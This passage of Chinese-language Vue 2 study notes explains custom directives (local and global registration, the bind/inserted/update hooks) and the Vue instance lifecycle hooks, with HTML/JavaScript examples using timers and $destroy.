		需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
	-->
	<body>
		<div id="root">
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				n:1
			},
			directives:{
//big函数何时会被调用？1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
	</script>
</html>
```

自定义指令定义语法：

1. 局部指令：
    1. 
        
        ```jsx
        new Vue({															
         	directives:{指令名:配置对象}   
         })
        
        directives:{
        fbind:{
        					bind(element,binding){}
        }
        }
        ```
        
    2. 
        
        ```jsx
        new Vue({															
         	directives:{指令名:回调函数}   
         })
        
        directives:{
        big(element,binding){} //'big':function(element,binding){}
        }
        ```
        
2. 全局指令：
    1. `Vue.directive(指令名,回调函数)`
    2. `Vue.directive(指令名,配置对象)`
    
    ```jsx
    Vue.directive('fbind',{
    	//指令与元素成功绑定时（一上来）
    	bind(element,binding){
    		element.value = binding.value
    	},
        //指令所在元素被插入页面时
        inserted(element,binding){
        	element.focus()
        },
        //指令所在的模板被重新解析时
        update(element,binding){
        	element.value = binding.value
        }
    })
    ```
    
3. 配置对象中常用的3个回调函数：
    1. `bind(element,binding)`：指令与元素成功绑定时调用
    2. `inserted(element,binding)`：指令所在元素被插入页面时调用
    3. `update(element,binding)`：指令所在模板结构被重新解析时调用

备注：

1. **指令定义时不加“v-”，但使用时要加“v-”**
2. **指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名**

## ****Vue生命周期****

### 引入生命周期

生命周期：

1. 又名：生命周期回调函数、生命周期函数、**生命周期钩子**
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的this指向是 vm 或组件实例对象

```html
<body>
    <div id="root">
        <h2 :style="{opacity}">巴啦啦小魔仙</h2>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                opacity:1
            },
            mounted(){
            setInterval(()=>{
                this.opacity-=0.01;
                if(this.opacity<=0) this.opacity=1
            },16)
        }
        })
        
    </script>
</body>
```

### ****分析生命周期****

$nextTick

deactivated

ativated

![Untitled](1%20Vue%E6%A0%B8%E5%BF%83%20dff57a8d625749b2a25464ed854d83b1/Untitled%205.png)

```jsx
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```

### ****总结生命周期****

**总结：**

常用的生命周期钩子：

1. `mounted`：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作
2. `beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等收尾工作

关于销毁Vue实例：

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后**自定义**事件会失效，但**原生DOM事件依然有效**
3. 一般不会在`beforeDestroy`操作数据，因为**即便操作数据，也不会再触发更新流程了**

```jsx
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false 

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})
	</script>
</html>
```